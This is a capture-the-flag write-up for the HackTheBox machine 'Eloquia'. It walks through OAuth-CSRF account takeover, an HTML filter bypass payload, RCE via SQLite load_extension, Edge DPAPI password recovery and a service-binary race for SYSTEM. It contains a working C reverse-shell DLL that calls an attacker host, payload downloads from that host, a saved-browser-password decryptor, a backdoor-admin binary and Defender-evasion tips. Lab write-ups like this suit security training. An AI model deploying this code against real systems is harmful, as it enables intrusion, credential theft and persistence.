# Eloquia — HackTheBox Writeup

**Box:** Eloquia
**OS:** Windows Server 2019 (Build 17763)
**Difficulty (subjective):** Hard — chains web (OAuth-CSRF + HTML-injection filter bypass), CVE-2024-47881 (SQLite `load_extension` RCE), Edge/Chromium DPAPI password recovery, and a Windows service-binary write-race for SYSTEM.

> All IPs / passwords / flags below are scrubbed or replaced with placeholders. Use your own engagement values.

---

## TL;DR Kill-chain

1. **Recon** — Web (IIS 10) + WinRM (5985). Site redirects to `eloquia.htb`. A second vhost `qooqle.htb` is the OAuth provider.
2. **Stage 2 — OAuth account-link CSRF on Eloquia.** HTML-injection in articles (with a content filter and an HTML sanitizer) is used to plant a meta-refresh that triggers an admin bot. Trick the bot's authenticated session into hitting Eloquia's OAuth callback with the *attacker's* Qooqle code → admin's Eloquia account becomes bound to the attacker's Qooqle account → log back in via OAuth Qooqle as admin.
3. **Stage 3 — RCE via CVE-2024-47881.** Admin panel exposes a SQL Explorer against SQLite with `enable_load_extension=1`. A custom DLL is uploaded through the Django-admin article *banner* upload, written to a known on-disk path, then loaded via `SELECT load_extension(...)` → shell as the low-priv web user → `user.txt`.
4. **Stage 4 — Lateral move via Edge DPAPI.** Read the saved Edge logins from web's profile, decrypt the AES-256 master key with `CryptUnprotectData()` (only callable inside web's own session), AES-GCM-decrypt each login → recover Olivia.KAT's plaintext password → WinRM as Olivia.
5. **Stage 5 — SYSTEM via Failure2Ban service-binary race.** Olivia.KAT has *write* on the service binary. The service auto-restarts on a fixed cadence; a tight `Copy-Item -Force` loop wins the stop→start window, so the next start runs our replacement binary as SYSTEM → `root.txt`.

---

## Stage 1 — Recon

### Port discovery
```bash
masscan -e tun0 -p 1-65535 --rate=500 --open-only <TARGET_IP>
# expect 80/tcp, 5985/tcp
nmap -sS -sV -A -p 80,5985 -Pn <TARGET_IP>
```
Port 80 redirects to `http://eloquia.htb/`. Add the host:
```bash
echo "<TARGET_IP> eloquia.htb qooqle.htb" | sudo tee -a /etc/hosts
```
A quick NetExec WinRM probe confirms the OS:
```bash
nxc winrm eloquia.htb
# WINRM ... [*] Windows 10 / Server 2019 Build 17763 (name:ELOQUIA) (domain:Eloquia)
```

### Surface mapping

- `eloquia.htb` is a custom Django blog. Login page exposes the OAuth path `/accounts/oauth2/qooqle/authorize/`.
- `qooqle.htb` is the OAuth provider on the same host. It has its own `/login/`, `/register/`, `/oauth2/authorize/`.

Form fields harvested by `curl`:

```text
# eloquia.htb /accounts/register/
csrfmiddlewaretoken, username, email, password1, password2

# qooqle.htb /register/
csrfmiddlewaretoken, first_name, last_name, username, password1, password2

# eloquia.htb /article/create/   (multipart/form-data)
csrfmiddlewaretoken, banner (file), title, content
```

---

## Stage 2 — OAuth-CSRF account takeover

### 2.1 Attacker accounts

Register identical attacker accounts on **both** sites (e.g. `attacker / Strong!P@ss1`). Use separate `requests.Session` objects per host.

### 2.2 The OAuth dance

Driving `/accounts/oauth2/qooqle/authorize/` with a logged-in Eloquia + Qooqle session lets you observe the full handshake:

```
Eloquia /accounts/oauth2/qooqle/authorize/
   → 302 → http://qooqle.htb/oauth2/authorize/?client_id=<CLIENT_ID>&response_type=code&redirect_uri=http://eloquia.htb/accounts/oauth2/qooqle/callback/
   → 200  consent page (user must POST allow=Authorize)
   → 302  to eloquia callback with ?code=<CODE>
   → eloquia consumes the code in the *current session* and links accounts
```

The consent POST needs every hidden field copied from the form: `csrfmiddlewaretoken, redirect_uri, scope=read write, nonce, client_id, state, response_type=code, code_challenge, code_challenge_method, claims, allow=Authorize`.

**The bug:** Eloquia's `/accounts/oauth2/qooqle/callback/` does *not* verify that the `code` was issued for *this* session. Whoever's session opens that URL will be linked to whoever owns that `code` on Qooqle. Land an attacker-issued `code` in the admin's authenticated browser → admin's Eloquia account becomes bound to the attacker's Qooqle account.

### 2.3 Carrier vector — HTML injection in articles

The article create form (`/article/create/`) reflects raw HTML inside `<div id="article-content">…</div>`, so any HTML that survives storage *and* render becomes live in the admin's browser when they view a reported article.

There are **two** filters in the way:

1. **Content filter on submit** — generic `ERROR: please check your input and try again`. Easy to misdiagnose: most of the time it actually fires when the **banner is too small** (≥20 KB needed). With a properly sized banner, the filter only flags raw `<` and certain entity sequences.
2. **HTML sanitizer on render** — bleach-style allow-list (`<p>`, `<a>`, etc.). Strips `<meta>`, `<iframe>`, `<object>`, `<embed>`, `<form>`, `<svg>`, `<link>`.

### 2.4 The payload that survives both layers

```html
<p>&lt;meta http-equiv = "refresh" content = "0; url=http://<ATTACKER>:8443/bait.html" &gt;&lt;/p&gt;
```

What's happening:

- The literal `<p>` … `</p>` outer wrapper is on the allow-list.
- The inner `&lt;meta…&gt;` slips past the submit-time content filter (it does not match the regex against raw `<meta>`).
- At render time the server entity-decodes once, so the page sent to the bot contains a real `<meta http-equiv="refresh" …>` — *inside* a `<p>`, but browsers happily honor a meta-refresh anywhere in the document.
- Spaces around `=` and the `;` after `0` are part of the obfuscation; they survive but defeat naïve regexes.

> If you try the no-semicolon trick (`&ltmeta…&gt`) the submit filter accepts it and the server entity-decoder happily reconstructs `<meta>`, but **bleach then strips it on render**. Use the literal-`<p>` + `&lt;meta&gt;` form.

### 2.5 The real report endpoint

The "Report" button on `/article/visit/<id>/` is a one-line JS handler buried in `/static/assets/js/article-comment.js`:

```js
$scope.reportArticle = function () {
    articleId = window.location.href.split('/')[5];
    window.location.href = "/article/report/"+articleId+"/";
};
```

So it's `GET /article/report/<id>/`, **not** `/article/visit/<id>/`. The bot only fires when this endpoint is hit.

### 2.6 Bait server — capture the code *live*

The Qooqle authorize codes are short-lived and single-use, so don't pre-bake one. The bait handler should call `get_fresh_code()` on every hit:

```python
class BaitHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith("/bait.html"):
            code = get_fresh_code(self.qooqle_session)   # drive Qooqle authorize+consent live
            self.send_response(302)
            self.send_header("Location", f"{ELOQUIA}/accounts/oauth2/qooqle/callback/?code={code}")
            self.end_headers()
```

### 2.7 End-to-end exploit

```python
# 1. Register + log in attacker on Eloquia and Qooqle (separate sessions)
# 2. Link attacker.eloquia ↔ attacker.qooqle by completing one OAuth dance
# 3. Plant article with the meta-refresh payload + a ≥20 KB banner.png
# 4. POST /article/report/<id>/ to summon the admin bot
# 5. Bait handler intercepts the bot, captures a fresh attacker code, 302s the
#    bot to /accounts/oauth2/qooqle/callback/?code=<fresh> in admin's session
# 6. Admin's Eloquia user is now bound to attacker's Qooqle
# 7. New requests.Session, fresh /accounts/login/, then drive
#    /accounts/oauth2/qooqle/authorize/ -> consent -> callback
#    profile reads "Howdy, admin"
```

Bait log on success looks like:
```
[+] BAIT HIT from <TARGET_IP> (UA=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ...)
[+] -> http://eloquia.htb/accounts/oauth2/qooqle/callback/?code=<…>
[bait] "GET /bait.html HTTP/1.1" 302 -
```

Pace tip: the bot took **~17 s** to bite on this engagement. A 30 s wait is too tight; budget 90–180 s.

Once linked, log in via OAuth Qooqle in a fresh session — no password needed — and you land as `admin`. From there `/dev/sql-explorer/`, `/accounts/admin/`, and `/accounts/admin/Eloquia/article/add/` all return 200.

---

## Stage 3 — RCE via SQLite `load_extension` (CVE-2024-47881)

### 3.1 SQL Explorer recon

Pickle/store the admin cookies, then drive `/dev/sql-explorer/play/` programmatically. Each query POST returns a page containing a `querylog_id`; follow `?fullscreen=1&rows=1000&querylog_id=<id>` to scrape clean rows from `<tr class="data-row">` (don't use the `<tbody>` selector — it picks up an unrelated stats sub-table).

```sql
PRAGMA database_list;          -- C:\Web\Eloquia\db.sqlite3
SELECT sqlite_version();       -- 3.45.1
SELECT load_extension('test'); -- "The specified module could not be found."
                               -- => enable_load_extension is on (CVE-2024-47881)
SELECT name FROM sqlite_master WHERE type='table';
SELECT id, username, email, is_superuser, is_staff FROM Eloquia_customuser;
```

Two superusers: `admin` and `Olivia.KAT`. Hashes are PBKDF2-SHA256 with **720 000** iterations — hashcat mode 10000 against rockyou is futile. Don't bother.

### 3.2 The DLL — design notes

- **`msfvenom` payloads get caught** by Defender on this build.
- Hand-roll a tiny WinSock + `CreateProcessA` reverse shell in C and compile with mingw-w64.
- **Critical gotcha:** SQLite calls the entry-point `sqlite3_<basename>_init` *synchronously*. If your init returns `SQLITE_ERROR`, SQLite immediately frees the loaded library. **Do all the work synchronously inside the init function** — a `CreateThread` worker dies the moment SQLite unloads the DLL.

```c
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")

#define LHOST "<ATTACKER_IP>"
#define LPORT 4444

__declspec(dllexport)
int sqlite3_pwn_init(void *db, char **err, const void *api) {
    WSADATA wsa; WSAStartup(MAKEWORD(2,2), &wsa);
    SOCKET sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    struct sockaddr_in srv = {0};
    srv.sin_family = AF_INET;
    srv.sin_port   = htons(LPORT);
    inet_pton(AF_INET, LHOST, &srv.sin_addr);
    if (connect(sock, (struct sockaddr*)&srv, sizeof(srv)) != 0) { closesocket(sock); return 1; }
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si); si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
    char cmd[] = "cmd.exe";
    if (CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    }
    closesocket(sock); WSACleanup();
    return 1;   /* SQLITE_ERROR — fine, the shell already ran inside this call */
}
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID l) { return TRUE; }
```

Build:
```bash
x86_64-w64-mingw32-gcc -shared -o pwn.dll pwn.c -lws2_32 -static -s
```

### 3.3 Upload + trigger

The Django admin form `/accounts/admin/Eloquia/article/add/` accepts arbitrary file types in the `banner` field. Upload `pwn.dll` programmatically (multipart with `csrfmiddlewaretoken, title, author, content, banner, reported, _save`). The file lands at:

- HTTP path: `http://eloquia.htb/static/assets/images/blog/pwn.dll`
- Disk path: `C:\Web\Eloquia\static\assets\images\blog\pwn.dll`

Sanity-check by `HEAD`-ing the file and matching MD5 vs. local — Defender does **not** delete it.

Catch the callback:
```bash
nc -lnvp 4444
```

Trigger via SQL Explorer (note the doubled backslashes in the SQL literal):
```sql
SELECT load_extension('C:\Web\Eloquia\static\assets\images\blog\pwn.dll');
```

A `cmd.exe` prompt drops onto the listener as `eloquia\web`. Privileges are minimal:
```
SeChangeNotifyPrivilege       Enabled
SeIncreaseWorkingSetPrivilege Disabled
```
No `SeImpersonate`/`SeAssignPrimaryToken`, so JuicyPotato/PrintSpoofer routes are out.

### 3.4 user.txt

```
type C:\Users\web\Desktop\user.txt
```

### 3.5 Driving the dumb shell

This box runs AppLocker — `cmd.exe` from the bare nc-listener works but you can't easily push large multi-line commands. A simple workaround on the attack side: a fifo-backed listener.

```bash
mkfifo /tmp/cmds
tail -f /tmp/cmds | nc -lnvp 4444
# in another terminal, pipe commands in:
printf 'whoami\r\n' > /tmp/cmds
```

Output stays in the original listener; the fifo is a write-only side-channel for input. This pattern matters in Stage 4 because PowerShell is blocked and we still need to drive a non-trivial install.

---

## Stage 4 — Lateral move via Edge DPAPI

### 4.1 What's on the box, what isn't

```
where python                 -> nothing
where python3                -> nothing
dir "C:\Program Files\Python*" -> Python311
%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data  (51 KB, readable)
%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State         (57 KB, readable)
```

AppLocker on this box blocks **PowerShell** and **certutil** (even writes to `%TEMP%`):
```
powershell -nop -c "..."
> This program is blocked by group policy. ...

certutil -urlcache -split -f http://... pcd.whl
> Access is denied.
```

But **`python.exe` is allow-listed**. We already used it indirectly via the SQLite DLL load; here we use it directly to download tooling.

### 4.2 Wheel delivery without SMB / certutil / IWR

On the attack box:
```bash
mkdir -p /tmp/wheels && cd /tmp/wheels
pip3 download --only-binary=:all: --platform win_amd64 --python-version 311 --no-deps \
     pycryptodomex pywin32
python3 -m http.server 8080 --bind 0.0.0.0
```

On target (driven through the dumb shell via the fifo trick above):
```cmd
"c:\Program Files\Python311\python.exe" -c "import urllib.request as u; \
 u.urlretrieve('http://<ATTACKER>:8080/pycryptodomex-3.23.0-cp37-abi3-win_amd64.whl', \
   r'C:\Users\web\AppData\Local\Temp\pycryptodomex-3.23.0-cp37-abi3-win_amd64.whl'); \
 u.urlretrieve('http://<ATTACKER>:8080/pywin32-311-cp311-cp311-win_amd64.whl', \
   r'C:\Users\web\AppData\Local\Temp\pywin32-311-cp311-cp311-win_amd64.whl'); print('ok')"
```

Pip refuses non-PEP-427 filenames, so don't rename the wheels to anything cute. Install:
```cmd
"c:\Program Files\Python311\python.exe" -m pip install --user --no-deps --no-index ^
  C:\Users\web\AppData\Local\Temp\pycryptodomex-3.23.0-cp37-abi3-win_amd64.whl ^
  C:\Users\web\AppData\Local\Temp\pywin32-311-cp311-cp311-win_amd64.whl
```

### 4.3 The decryptor

Edge / Chromium-family browsers store the AES-256 master key inside `Local State` under `os_crypt.encrypted_key`, base64-encoded with a 5-byte `DPAPI` prefix. The key is wrapped with the *user's* DPAPI master key — only callable while inside that user's logon session, which is exactly what we have.

Each row in `Login Data.logins.password_value` is laid out as:

```
3-byte version prefix ("v10")  | 12-byte IV | ciphertext | 16-byte AES-GCM tag
```

```python
# decrypt.py — must run as the Edge profile owner (web)
import base64, json, os, sqlite3, shutil
import win32crypt
from Cryptodome.Cipher import AES

LOCAL_STATE = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State")
LOGIN_DATA  = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data")

with open(LOCAL_STATE, encoding="utf-8") as f:
    enc_key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]   # strip "DPAPI"
key = win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]

work = os.path.expandvars(r"%TEMP%\login_data_copy")
shutil.copyfile(LOGIN_DATA, work)
con = sqlite3.connect(work)
for url, user, pw in con.execute("SELECT origin_url,username_value,password_value FROM logins"):
    if not pw: continue
    iv, ct, tag = pw[3:15], pw[15:-16], pw[-16:]
    try:
        plain = AES.new(key, AES.MODE_GCM, nonce=iv).decrypt_and_verify(ct, tag).decode(errors="replace")
    except Exception as e:
        plain = f"<decrypt-failed: {e}>"
    print(f"URL : {url}\nUSER: {user}\nPASS: {plain}\n---")
```

Push it the same way (HTTP `urlretrieve` → `python.exe decrypt.py`).

You'll get back several rows; the interesting one is the saved login for `http://eloquia.htb/accounts/login/` under `Olivia.KAT`. Verify:

```bash
nxc winrm <TARGET_IP> -u Olivia.KAT -p '<RECOVERED_PASSWORD>'
# -> [+] Eloquia\Olivia.KAT:<...> (Pwn3d!)
```

Move on with `evil-winrm` or keep driving via `nxc winrm -X`.

---

## Stage 5 — SYSTEM via Failure2Ban service-binary race

### 5.1 The hint and the ACL

```
type C:\Users\Olivia.KAT\Desktop\Todo.txt
```
…points at `App.config` and a "Failure2Ban" service. Locate it:
```powershell
Get-ChildItem -Path "C:\" -Recurse -File -Filter "App.config" -ErrorAction SilentlyContinue
# C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\App.config

icacls "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe"
# ELOQUIA\Olivia.KAT:(I)(RX,W)
```
That `W` is the win.

(`sc qc Failure2Ban` is *Access denied* for Olivia, but that doesn't matter — the cadence in `ServiceLog_*.txt` shows the service stops + starts itself every ~5 minutes:)

```
1/10/2026 1:27:10 AM - Service is started
1/10/2026 1:27:10 AM - Proccessing log file
…
1/10/2026 1:32:10 AM - Service is stopped
1/10/2026 1:32:10 AM - Service is started
```

### 5.2 The replacement binary

We don't need to be a real Windows service — SCM will just time out and mark the service failed, but our binary already did its job. Keep it minimal: read `Administrator\Desktop\root.txt` to a world-readable location, optionally add a backdoor admin and pop a SYSTEM shell back to the listener for sustained access.

```c
// loot.c — runs as SYSTEM on next service start
#include <windows.h>
#include <stdio.h>
int main(void) {
    CopyFileA("C:\\Users\\Administrator\\Desktop\\root.txt",
              "C:\\Users\\Public\\rt.txt", FALSE);
    system("icacls C:\\Users\\Public\\rt.txt /grant Everyone:R >nul 2>&1");
    /* optional belt-and-braces: backup local admin */
    system("net user PwnAdm <STRONG_PASSWORD> /add >nul 2>&1");
    system("net localgroup Administrators PwnAdm /add >nul 2>&1");
    /* optional: reverse shell back to attacker for SYSTEM interactivity */
    return 0;
}
```
```bash
x86_64-w64-mingw32-gcc -o loot.exe loot.c -static -s
```

### 5.3 Winning the race

Olivia.KAT's PowerShell *is* allowed (the AppLocker policy was per-user — only `web` was hard-restricted). Drop the binary somewhere writable, then loop on `Copy-Item -Force`. While the service is running the EXE is locked by the SCM-spawned process and the copy throws; in the brief stop→start window the copy succeeds:

```powershell
$src = "C:\Users\Olivia.KAT\AppData\Local\Temp\loot.exe"
$dst = "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe"
$deadline = (Get-Date).AddMinutes(7)
while ((Get-Date) -lt $deadline) {
    try {
        Copy-Item -Force $src $dst -ErrorAction Stop
        Write-Host "[+] OVERWRITE OK at $(Get-Date -f HH:mm:ss)"
        break
    } catch { Start-Sleep -Milliseconds 200 }
}
```
Run it via `nxc winrm -X` or an evil-winrm session. Within one ~5-minute cycle the loop wins; on the next service start the SCM spawns *our* binary as SYSTEM.

### 5.4 root.txt

```powershell
Get-FileHash "C:\Program Files\Qooqle IPS Software\...\Failure2Ban.exe"  # should match loot.exe
Get-Content C:\Users\Public\rt.txt
```

---

## Defender-evasion notes

- **mingw-w64 + a hand-rolled WinSock reverse shell** is enough to dodge Defender on this build. Anything `msfvenom` emits is signatured.
- For SQLite-loaded DLLs, the **synchronous-shell-inside-init** pattern is mandatory. SQLite frees the library on `SQLITE_ERROR`; threads die with it.
- `python.exe` being allow-listed while `powershell.exe`/`certutil.exe`/`bitsadmin.exe` are blocked is a useful AppLocker pattern to remember on Windows pentests — `urllib.request` and a tiny vendored toolchain go a long way.

---

## TTPs / artefacts checklist

| Artefact | Path |
|---|---|
| Attacker accounts | `eloquia.htb` + `qooqle.htb` |
| Bait HTTP server | `http://<ATTACKER>:8443/bait.html` (handler 302s to Eloquia callback w/ live attacker code) |
| Custom DLL | `pwn.dll` (`sqlite3_pwn_init`, synchronous reverse shell) |
| DLL on-disk path | `C:\Web\Eloquia\static\assets\images\blog\pwn.dll` |
| RCE trigger | `SELECT load_extension('C:\Web\Eloquia\static\assets\images\blog\pwn.dll');` |
| Shell user | `eloquia\web` — `SeChangeNotify` only |
| DPAPI inputs | `%LOCALAPPDATA%\Microsoft\Edge\User Data\{Local State, Default\Login Data}` |
| Lateral creds | `Olivia.KAT` (recovered via Edge DPAPI) |
| Vulnerable binary | `C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe` (Olivia W) |
| Restart cadence | ~5 minutes (per `ServiceLog_*.txt`) |
| Final shell | `NT AUTHORITY\SYSTEM` |

---

## Lessons learned

- **Reading client-side JS pays.** The "Report" button looked like it submitted to `/article/visit/<id>/`; the real endpoint `/article/report/<id>/` was visible only by reading `article-comment.js`.
- **Banner size masquerades as a content filter.** Don't waste hours obfuscating payloads if the rejection message is generic — confirm the banner is ≥20 KB first.
- **Two-stage filters need two-stage bypasses.** The submit-time content filter and the render-time bleach allow-list reject different things; only the literal-`<p>` + `&lt;meta&gt;` form crosses both.
- **DPAPI is bound to the live session.** You don't need the user's password — you just need code execution as that user. Once you have it, Edge/Chrome saved logins are an open book.
- **Service-binary write + auto-restart cadence == SYSTEM.** No exotic tooling required. A polling `Copy-Item -Force` loop and a 5-minute cup of coffee is enough.

---

*Happy hunting.*
